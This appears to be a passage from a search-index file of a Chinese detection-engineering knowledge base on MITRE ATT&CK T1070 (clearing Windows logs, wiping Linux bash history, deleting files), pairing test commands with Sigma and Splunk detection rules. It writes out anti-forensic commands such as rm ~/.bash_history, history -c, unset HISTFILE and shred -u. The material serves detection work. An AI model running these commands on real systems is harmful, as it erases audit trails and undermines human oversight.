windows\u65e5\u5fd7>\u7cfb\u7edf\u65e5\u5fd7>\u6e05\u9664\u65e5\u5fd7 windows\u65e5\u5fd7>\u5b89\u5168\u65e5\u5fd7>\u6e05\u9664\u65e5\u5fd7 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma title: windows \u65e5\u5fd7\u6e05\u9664 description: win7 and windows server 2003\u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: security detection: \u200b selection: \u200b EventID: \u200b - 1102 \u200b - 517 \u200b condition: selection level: medium title: windows \u65e5\u5fd7\u6e05\u9664 description: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: system detection: \u200b selection: \u200b EventID: 104 \u200b condition: selection level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1070-001 https://attack.mitre.org/techniques/T1070/001/","title":"T1070-001-windows-\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#t1070-001-windows-","text":"","title":"T1070-001-windows-\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002 \u5728\u57fa\u4e8e\u7279\u5f81\u76d1\u6d4b\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u963b\u6b62\u76d1\u6d4b\u7279\u5f81\u76f8\u5173\u7684\u6570\u636e\u88ab\u53d1\u9001\u51fa\u53bb\uff0c\u4ee5\u4fbf\u4e8e\u963b\u6b62\u5b89\u5168\u4eba\u5458\u8fdb\u884c\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u6709\u5f88\u591a\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u7684\u8fdb\u7a0b\uff08splunk\u8f6c\u53d1\u5668\u3001Filebate\u3001rsyslog\u7b49\uff09\u3002 \u5177\u4f53\u6848\u4f8b\uff0c\u4f60\u53ef\u4ee5\u53c2\u8003\u7ed5\u8fc7sysmon\u76f8\u5173\u7684\u6587\u7ae0\u3002\uff08PS\uff1a\u82f1\u8bed\u4e0d\u597d\u3001\u8c37\u6b4c\u7ffb\u8bd1\u771f\u5fc3\uff0c\uff0c\uff0c\u592a\u96be\u4e86\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_1","text":"\u5728\u6b63\u5e38\u7684\u64cd\u4f5c\u671f\u95f4\u5185\uff0c\u4e8b\u4ef6\u65e5\u5fd7\u4e0d\u592a\u53ef\u80fd\u4f1a\u88ab\u523b\u610f\u6e05\u9664\u3002\u4f46\u662f\u6076\u610f\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u6765\u5c1d\u8bd5\u63a9\u76d6\u81ea\u5df1\u7684\u8e2a\u8ff9\u3002\u5f53\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6e05\u9664\u65f6\uff0c\u5b83\u662f\u53ef\u7591\u7684\u3002\u53d1\u73b0\u201c\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u201d\u65f6\u53ef\u80fd\u610f\u5473\u7740\u6709\u6076\u610f\u653b\u51fb\u8005\u5229\u7528\u4e86\u6b64\u9879\u6280\u672f\u3002 \u96c6\u4e2d\u6536\u96c6\u4e8b\u4ef6\u65e5\u5fd7\u7684\u4e00\u4e2a\u597d\u5904\u5c31\u662f\u4f7f\u653b\u51fb\u8005\u66f4\u96be\u4ee5\u63a9\u76d6\u4ed6\u4eec\u7684\u8e2a\u8ff9\uff0c\u4e8b\u4ef6\u8f6c\u53d1\u5141\u8bb8\u5c06\u6536\u96c6\u5230\u7684\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u53d1\u9001\u7ed9\u591a\u4e2a\u6536\u96c6\u5668\uff08splunk\u3001elk\u7b49\uff09\uff0c\u4ece\u800c\u5b9e\u73b0\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\u3002\u4f7f\u7528\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\uff0c\u53ef\u4ee5\u6700\u5927\u9650\u5ea6\u7684\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0\u5a01\u80c1\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_2","text":"windows security windows system","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_3","text":"\u8fdb\u5165windows\u4e8b\u4ef6\u67e5\u770b\u5668 windows\u65e5\u5fd7>\u7cfb\u7edf\u65e5\u5fd7>\u6e05\u9664\u65e5\u5fd7 windows\u65e5\u5fd7>\u5b89\u5168\u65e5\u5fd7>\u6e05\u9664\u65e5\u5fd7","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#sigma","text":"title: windows \u65e5\u5fd7\u6e05\u9664 description: win7 and windows server 2003\u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: security detection: \u200b selection: \u200b EventID: \u200b - 1102 \u200b - 517 \u200b condition: selection level: medium title: windows \u65e5\u5fd7\u6e05\u9664 description: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: system detection: \u200b selection: \u200b EventID: 104 \u200b condition: selection level: medium","title":"sigma"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/#_7","text":"MITRE-ATT&CK-T1070-001 https://attack.mitre.org/techniques/T1070/001/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/","text":"T1070-003-linux-\u6e05\u9664\u5386\u53f2\u8bb0\u5f55 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 macOS\u548cLinux\u90fd\u4f1a\u8ddf\u8e2a\u7528\u6237\u5728\u7ec8\u7aef\u4e2d\u8f93\u5165\u7684\u547d\u4ee4\uff0c\u4ee5\u4fbf\u7528\u6237\u53ef\u4ee5\u8f7b\u677e\u8bb0\u4f4f\u4ed6\u4eec\u6240\u505a\u7684\u4e8b\u60c5\u3002\u53ef\u4ee5\u901a\u8fc7\u51e0\u79cd\u4e0d\u540c\u7684\u65b9\u5f0f\u8bbf\u95ee\u8fd9\u4e9b\u65e5\u5fd7\u3002\u7528\u6237\u5728\u767b\u5f55\u540e\uff0c\u5c06\u5728\u73af\u5883\u53d8\u91cf\u6307\u5411\u7684\u6587\u4ef6\u4e2d\u8ddf\u8e2a\u6b64\u547d\u4ee4\u5386\u53f2\u8bb0\u5f55HISTFILE\u3002\u5f53\u7528\u6237\u6ce8\u9500\u7cfb\u7edf\u65f6\uff0c\u6b64\u4fe1\u606f\u5c06\u66f4\u65b0\u5230\u7528\u6237\u4e3b\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u4e2d~/.bash_history\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\u5b83\u5141\u8bb8\u7528\u6237\u67e5\u770b\u4ed6\u4eec\u4e4b\u524d\u5728\u4e0d\u540c\u4f1a\u8bdd\u4e2d\u4f7f\u7528\u8fc7\u7684\u547d\u4ee4\u3002\u7531\u4e8e\u4fdd\u5b58\u4e86\u5728\u547d\u4ee4\u884c\u4e0a\u8f93\u5165\u7684\u6240\u6709\u5185\u5bb9\uff0c\u56e0\u6b64\u4e5f\u4f1a\u4fdd\u5b58\u5728\u547d\u4ee4\u884c\u4e0a\u8f93\u5165\u7684\u5bc6\u7801\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6ee5\u7528\u6b64\u529f\u80fd\u5728\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u641c\u7d22\u660e\u6587\u5bc6\u7801\u3002\u6b64\u5916\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7684\u65b9\u6cd5\u4e0d\u540c\uff0c\u4f60\u9700\u8981\u9632\u6b62\u81ea\u5df1\u7684\u5386\u53f2\u8bb0\u5f55\u4e2d\u51fa\u73b0\u8fd9\u4e9b\u547d\u4ee4\uff0c\u4f8b\u5982unset HISTFILE\u3001export HISTFILESIZE=0\u3001history -c\u3001rm ~/.bash_history\u3002 \u6d4b\u8bd5\u6848\u4f8b rm ~/.bash_history echo \" \" > .bash_history cat /dev/null > ~/.bash_history ln -sf /dev/null ~/.bash_history truncate -s0 ~/.bash_history unset HISTFILE export HISTFILESIZE=0 history -c \u68c0\u6d4b\u65e5\u5fd7 linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55 \u6d4b\u8bd5\u590d\u73b0 icbc@icbc:~$ rm ~/.bash_history \u6d4b\u8bd5\u7559\u75d5 \u57fa\u4e8eaudit\u65e5\u5fd7 \u6682\u65e0 \u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55 icbc@icbc:~$ history \u200b 7 rm ~/.bash_history \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 \u57fa\u4e8eaudit\u65e5\u5fd7 \u573a\u666f\uff1arm -rf~ / .bash_history index=linux sourcetype=linux_audit syscall=263 | table time,host,auid,uid,euid,exe,key index=linux sourcetype=linux_audit type=PATH name=.bash_history nametype=delete | table time,name,nametype \u573a\u666f\uff1aecho \" \" > .bash_history index=linux sourcetype=\"linux_audit\" bash_history_changes exe!=/home/ec2-user/splunk/bin/splunkd syscall=257 a2!=0 AND a3!=0 | table host,syscall,syscall_name,exe,auid \u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55 index=linux sourcetype=\"bash_history\" \"rm * .bash_history\" #\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u53ea\u505a\u4e86\u6700\u7b80\u5355\u7684\u6f14\u793a\uff0c\u6bd4\u5982history -c \u662f\u65e0\u6cd5\u901a\u8fc7bash\u5386\u53f2\u8bb0\u5f55\u8fdb\u884c\u68c0\u6d4b\u7684\uff01\u5176\u4ed6\u547d\u4ee4\u5982\u4f55\u68c0\u6d4b\uff0c\u4f60\u53ef\u4ee5\u81ea\u884c\u6d4b\u8bd5\u8bb0\u5f55\u3002 \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1070-003 https://attack.mitre.org/techniques/T1070/003/","title":"T1070-003-linux-\u6e05\u9664\u5386\u53f2\u8bb0\u5f55"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#t1070-003-linux-","text":"","title":"T1070-003-linux-\u6e05\u9664\u5386\u53f2\u8bb0\u5f55"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#attck","text":"macOS\u548cLinux\u90fd\u4f1a\u8ddf\u8e2a\u7528\u6237\u5728\u7ec8\u7aef\u4e2d\u8f93\u5165\u7684\u547d\u4ee4\uff0c\u4ee5\u4fbf\u7528\u6237\u53ef\u4ee5\u8f7b\u677e\u8bb0\u4f4f\u4ed6\u4eec\u6240\u505a\u7684\u4e8b\u60c5\u3002\u53ef\u4ee5\u901a\u8fc7\u51e0\u79cd\u4e0d\u540c\u7684\u65b9\u5f0f\u8bbf\u95ee\u8fd9\u4e9b\u65e5\u5fd7\u3002\u7528\u6237\u5728\u767b\u5f55\u540e\uff0c\u5c06\u5728\u73af\u5883\u53d8\u91cf\u6307\u5411\u7684\u6587\u4ef6\u4e2d\u8ddf\u8e2a\u6b64\u547d\u4ee4\u5386\u53f2\u8bb0\u5f55HISTFILE\u3002\u5f53\u7528\u6237\u6ce8\u9500\u7cfb\u7edf\u65f6\uff0c\u6b64\u4fe1\u606f\u5c06\u66f4\u65b0\u5230\u7528\u6237\u4e3b\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u4e2d~/.bash_history\u3002\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\u5b83\u5141\u8bb8\u7528\u6237\u67e5\u770b\u4ed6\u4eec\u4e4b\u524d\u5728\u4e0d\u540c\u4f1a\u8bdd\u4e2d\u4f7f\u7528\u8fc7\u7684\u547d\u4ee4\u3002\u7531\u4e8e\u4fdd\u5b58\u4e86\u5728\u547d\u4ee4\u884c\u4e0a\u8f93\u5165\u7684\u6240\u6709\u5185\u5bb9\uff0c\u56e0\u6b64\u4e5f\u4f1a\u4fdd\u5b58\u5728\u547d\u4ee4\u884c\u4e0a\u8f93\u5165\u7684\u5bc6\u7801\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6ee5\u7528\u6b64\u529f\u80fd\u5728\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u641c\u7d22\u660e\u6587\u5bc6\u7801\u3002\u6b64\u5916\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7684\u65b9\u6cd5\u4e0d\u540c\uff0c\u4f60\u9700\u8981\u9632\u6b62\u81ea\u5df1\u7684\u5386\u53f2\u8bb0\u5f55\u4e2d\u51fa\u73b0\u8fd9\u4e9b\u547d\u4ee4\uff0c\u4f8b\u5982unset HISTFILE\u3001export HISTFILESIZE=0\u3001history -c\u3001rm ~/.bash_history\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_1","text":"rm ~/.bash_history echo \" \" > .bash_history cat /dev/null > ~/.bash_history ln -sf /dev/null ~/.bash_history truncate -s0 ~/.bash_history unset HISTFILE export HISTFILESIZE=0 history -c","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_2","text":"linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_3","text":"icbc@icbc:~$ rm ~/.bash_history","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_4","text":"\u57fa\u4e8eaudit\u65e5\u5fd7 \u6682\u65e0 \u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55 icbc@icbc:~$ history \u200b 7 rm ~/.bash_history","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#splunk","text":"","title":"splunk\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#audit","text":"\u573a\u666f\uff1arm -rf~ / .bash_history index=linux sourcetype=linux_audit syscall=263 | table time,host,auid,uid,euid,exe,key index=linux sourcetype=linux_audit type=PATH name=.bash_history nametype=delete | table time,name,nametype \u573a\u666f\uff1aecho \" \" > .bash_history index=linux sourcetype=\"linux_audit\" bash_history_changes exe!=/home/ec2-user/splunk/bin/splunkd syscall=257 a2!=0 AND a3!=0 | table host,syscall,syscall_name,exe,auid","title":"\u57fa\u4e8eaudit\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#bash","text":"index=linux sourcetype=\"bash_history\" \"rm * .bash_history\" #\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u53ea\u505a\u4e86\u6700\u7b80\u5355\u7684\u6f14\u793a\uff0c\u6bd4\u5982history -c \u662f\u65e0\u6cd5\u901a\u8fc7bash\u5386\u53f2\u8bb0\u5f55\u8fdb\u884c\u68c0\u6d4b\u7684\uff01\u5176\u4ed6\u547d\u4ee4\u5982\u4f55\u68c0\u6d4b\uff0c\u4f60\u53ef\u4ee5\u81ea\u884c\u6d4b\u8bd5\u8bb0\u5f55\u3002","title":"\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-003-linux-%E6%B8%85%E9%99%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/#_7","text":"MITRE-ATT&CK-T1070-003 https://attack.mitre.org/techniques/T1070/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/","text":"T1070-004-linux-\u6587\u4ef6\u5220\u9664 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u5728\u7cfb\u7edf\u4e0a\u5220\u9664\u6216\u521b\u5efa\u6076\u610f\u8f6f\u4ef6\u3001\u5de5\u5177\u6216\u5176\u4ed6\u975e\u672c\u673a\u6587\u4ef6\uff0c\u53ef\u80fd\u4f1a\u7559\u4e0b\u5173\u4e8e\u5728\u4e3b\u673a\u4e0a\u6267\u884c\u7684\u64cd\u4f5c\u4ee5\u53ca\u64cd\u4f5c\u65b9\u5f0f\u7684\u75d5\u8ff9\u3002\u4f5c\u4e3a\u5165\u4fb5\u540e\u6e05\u7406\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5165\u4fb5\u8fc7\u7a0b\u4e2d\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6\u4ee5\u4fdd\u6301\u5176\u9690\u853d\u6027\u3002 \u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86\u53ef\u7528\u4e8e\u6267\u884c\u6e05\u7406\u7684\u5de5\u5177\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u3002\u793a\u4f8b\u5305\u62ec\u672c\u673acmd\u529f\u80fd\uff08\u5982del\uff09\uff0c\u5b89\u5168\u5220\u9664\u5de5\u5177\uff08\u5982Windows Sysinternals SDelete\uff09\u6216\u5176\u4ed6\u7b2c\u4e09\u65b9\u6587\u4ef6\u5220\u9664\u5de5\u5177\u3002 \u6d4b\u8bd5\u6848\u4f8b rm -rf abc. text #\u5f3a\u5236\u5220\u9664abc.txt rm -f abc.txt #\u5f3a\u5236\u5220\u9664abc.txt shred -u abc.txt #\u5f7b\u5e95\u7c89\u788e\u5220\u9664\u6587\u4ef6abc.txt \u68c0\u6d4b\u65e5\u5fd7 linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55 \u6d4b\u8bd5\u590d\u73b0 icbc@icbc:~$ rm -r abc.txt icbc@icbc:~$ shred -u abc.txt \u6d4b\u8bd5\u7559\u75d5 \u57fa\u4e8eaudit\u65e5\u5fd7 \u6682\u65e0 \u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55 icbc@icbc:~$ history 650 rm -r abc.txt 654 shred -u abc.txt \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 \u57fa\u4e8eaudit\u65e5\u5fd7 index=linux sourcetype=linux_audit syscall=59 comm=shred | table host,auid,msg index=linux sourcetype=linux_audit type=execve shred .bash_history | table host,msg,a0,a2 index=linux sourcetype=linux_audit syscall=263 | table host,auid,uid,eid,exe index=linux sourcetype=linux_audit syscall=82 exe=/usr/bin/shred | table host,auid,uid,eid,exe \u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55 index=linux sourcetype=\"bash_history\" bash_command=\"rm \" OR bash_command=\"shred -u \" \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1070-004 https://attack.mitre.org/techniques/T1070/004/ linux\u4e0brm\u547d\u4ee4\u8be6\u89e3 https://www.cnblogs.com/ftl1012/p/9247107.html","title":"T1070-004-linux-\u6587\u4ef6\u5220\u9664"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#t1070-004-linux-","text":"","title":"T1070-004-linux-\u6587\u4ef6\u5220\u9664"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#attck","text":"\u653b\u51fb\u8005\u5728\u7cfb\u7edf\u4e0a\u5220\u9664\u6216\u521b\u5efa\u6076\u610f\u8f6f\u4ef6\u3001\u5de5\u5177\u6216\u5176\u4ed6\u975e\u672c\u673a\u6587\u4ef6\uff0c\u53ef\u80fd\u4f1a\u7559\u4e0b\u5173\u4e8e\u5728\u4e3b\u673a\u4e0a\u6267\u884c\u7684\u64cd\u4f5c\u4ee5\u53ca\u64cd\u4f5c\u65b9\u5f0f\u7684\u75d5\u8ff9\u3002\u4f5c\u4e3a\u5165\u4fb5\u540e\u6e05\u7406\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5165\u4fb5\u8fc7\u7a0b\u4e2d\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6\u4ee5\u4fdd\u6301\u5176\u9690\u853d\u6027\u3002 \u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86\u53ef\u7528\u4e8e\u6267\u884c\u6e05\u7406\u7684\u5de5\u5177\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u3002\u793a\u4f8b\u5305\u62ec\u672c\u673acmd\u529f\u80fd\uff08\u5982del\uff09\uff0c\u5b89\u5168\u5220\u9664\u5de5\u5177\uff08\u5982Windows Sysinternals SDelete\uff09\u6216\u5176\u4ed6\u7b2c\u4e09\u65b9\u6587\u4ef6\u5220\u9664\u5de5\u5177\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_1","text":"rm -rf abc. text #\u5f3a\u5236\u5220\u9664abc.txt rm -f abc.txt #\u5f3a\u5236\u5220\u9664abc.txt shred -u abc.txt #\u5f7b\u5e95\u7c89\u788e\u5220\u9664\u6587\u4ef6abc.txt","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_2","text":"linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_3","text":"icbc@icbc:~$ rm -r abc.txt icbc@icbc:~$ shred -u abc.txt","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-linux-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_4","text":"\u57fa\u4e8eaudit\u65e5\u5fd7 \u6682\u65e0 \u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55 icbc@icbc:~$ history 650 rm -r abc.txt 654 shred -u 